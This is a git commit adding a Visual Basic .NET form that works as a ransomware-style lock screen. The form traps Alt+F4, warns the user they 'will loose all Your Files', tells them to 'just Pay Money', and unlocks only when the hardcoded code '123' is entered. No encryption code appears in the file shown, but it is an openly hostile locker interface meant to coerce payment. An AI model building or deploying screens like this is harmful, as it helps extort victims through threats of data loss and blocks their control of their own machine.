c57b099d8a0a4f3410623aa3873ed577eb303156
Adarsh Anand <33658792+AdarshRazor@users.noreply.github.com>
2020-01-20 11:18:55 +0530

    Add files via upload

---
+++ Form2.vb
@@ -0,0 +1,36 @@
+﻿Public Class Form2
+
+    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Label1.Left = (Label1.Parent.Width / 2) - (Label1.Width / 2)
+
+        Label2.Top = (Label2.Parent.Height / 2) - 200
+        Label3.Top = (Label2.Parent.Height / 2) + 10
+        Label4.Top = (Label2.Parent.Height / 2) + 50
+        TextBox1.Top = (Label2.Parent.Height / 2) + 70
+
+        Button1.Top = (Label2.Parent.Height / 2) + 68
+        Button1.Left = (Label2.Width / 2) + 50
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        If TextBox1.Text = "123" Then
+            Me.Close()
+            Form3.Show()
+        End If
+    End Sub
+
+    
+    Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs) Handles Button1.KeyDown
+        If e.KeyData = Keys.Alt + Keys.F4 Then
+            MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
+            e.Handled = True
+        End If
+    End Sub
+
+    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
+        If e.KeyData = Keys.Alt + Keys.F4 Then
+            MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
+            e.Handled = True
+        End If
+    End Sub
+End Class
